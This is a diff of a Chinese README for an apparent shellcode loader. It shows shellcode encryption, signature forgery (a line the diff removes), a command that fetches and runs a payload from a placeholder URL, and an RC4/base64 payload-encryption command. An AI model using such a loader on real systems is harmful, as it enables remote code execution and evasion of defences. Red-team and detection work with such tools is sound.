@@ -226,7 +226,6 @@ python main.py
 - Shellcode 加密
 - Rust 编译（带特性选择）
 - 文件复制到 `output/` 目录
-- 签名伪造（如启用）
 
 #### 4. 分离式加载
 
@@ -243,16 +242,10 @@ python main.py
 ./rsl.exe http://example.com/payload.bin
 ```
 
-**GUI配置默认地址：**
 在GUI中选择"分离式加载"方式时，会显示一个输入框用于设置默认payload地址。
 
-**编译时配置默认地址：**
-```bash
-set "RSL_DEFAULT_PAYLOAD_ADDRESS=my_payload.bin" && cargo build --release --features=load_payload_cmdline
-```
-
 - payload二进制文件是在编译后生成的src/encrypt.bin
-- 也可以自己通过encrypt.py生成（主要加密和编码方式与exe文件对齐）：
+- 也可以自己通过encrypt.py生成（注意加密和编码方式与exe文件对齐）：
 ```
 python encrypt.py -i input/calc.bin -o src/encrypt.bin -m rc4 -e base64
 ```
